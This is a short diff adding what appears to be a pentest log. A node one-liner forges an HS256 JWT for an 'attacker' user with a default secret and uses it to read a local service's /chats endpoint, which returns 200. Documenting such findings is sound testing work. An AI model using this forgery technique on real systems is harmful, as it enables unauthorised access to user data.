@@ -1,0 +1,5 @@
+$ node -e 'import("./testing/pentest/lib/jwt.ts").then(async m=>{const t=m.signHs256(m.accessClaims("attacker","a@b.pt"),"change-me-in-every-environment");console.log("forged token (default secret):",t.slice(0,40)+"...");const r=await fetch("http://127.0.0.1:4002/chats",{headers:{authorization:"Bearer "+t}});console.log("GET /chats with forged Bearer ->",r.status);})'
+forged token (default secret): eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9.eyJ...
+GET /chats with forged Bearer -> 200
+
+[exit 0]
